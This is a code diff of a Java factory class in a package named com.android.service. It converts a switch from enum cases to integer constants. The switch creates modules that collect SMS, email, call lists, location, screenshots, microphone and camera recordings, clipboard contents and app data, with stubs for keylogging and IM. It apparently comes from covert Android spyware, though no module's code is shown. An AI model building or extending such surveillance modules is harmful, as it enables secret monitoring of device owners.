@@ -13,7 +13,7 @@ import com.android.service.auto.Cfg;
 import com.android.service.interfaces.AbstractFactory;
 import com.android.service.util.Check;
 
-public class AgentFactory implements AbstractFactory<AgentBase, AgentType> {
+public class AgentFactory implements AbstractFactory<AgentBase, Integer> {
 	private static final String TAG = "AgentFactory";
 
 	/**
@@ -24,74 +24,74 @@ public class AgentFactory implements AbstractFactory<AgentBase, AgentType> {
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	public AgentBase create(AgentType type) {
+	public AgentBase create(Integer agentType) {
 		AgentBase a = null;
 
-		switch (type) {
-			case AGENT_SMS:
+		switch (agentType) {
+			case AgentType.AGENT_SMS:
 				a = new AgentMessage();
 				break;
 
-			case AGENT_TASK:
+			case AgentType.AGENT_TASK:
 				a = new AgentTask();
 				break;
 
-			case AGENT_CALLLIST:
+			case AgentType.AGENT_CALLLIST:
 				a = new AgentCallList();
 				break;
 
-			case AGENT_DEVICE:
+			case AgentType.AGENT_DEVICE:
 				a = new AgentDevice();
 				break;
 
-			case AGENT_POSITION:
+			case AgentType.AGENT_POSITION:
 				a = new AgentPosition();
 				break;
 
-			case AGENT_CALL:
+			case AgentType.AGENT_CALL:
 				break;
 
-			case AGENT_CALL_LOCAL:
+			case AgentType.AGENT_CALL_LOCAL:
 				break;
 
-			case AGENT_KEYLOG:
+			case AgentType.AGENT_KEYLOG:
 				break;
 
-			case AGENT_SNAPSHOT:
+			case AgentType.AGENT_SNAPSHOT:
 				a = new AgentSnapshot();
 				break;
 
-			case AGENT_URL:
+			case AgentType.AGENT_URL:
 				break;
 
-			case AGENT_IM:
+			case AgentType.AGENT_IM:
 				break;
 
-			case AGENT_EMAIL:
+			case AgentType.AGENT_EMAIL:
 				a = new AgentMessage();
 				break;
 
-			case AGENT_MIC:
+			case AgentType.AGENT_MIC:
 				a = new AgentMic();
 				break;
 
-			case AGENT_CAM:
+			case AgentType.AGENT_CAM:
 				a = new AgentCamera();
 				break;
 
-			case AGENT_CLIPBOARD:
+			case AgentType.AGENT_CLIPBOARD:
 				a = new AgentClipboard();
 				break;
 
-			case AGENT_CRISIS:
+			case AgentType.AGENT_CRISIS:
 				a = new AgentCrisis();
 				break;
 
-			case AGENT_APPLICATION:
+			case AgentType.AGENT_APPLICATION:
 				a = new AgentApplication();
 				break;
 
-			case AGENT_LIVEMIC:
+			case AgentType.AGENT_LIVEMIC:
 				break;
 
 			default:
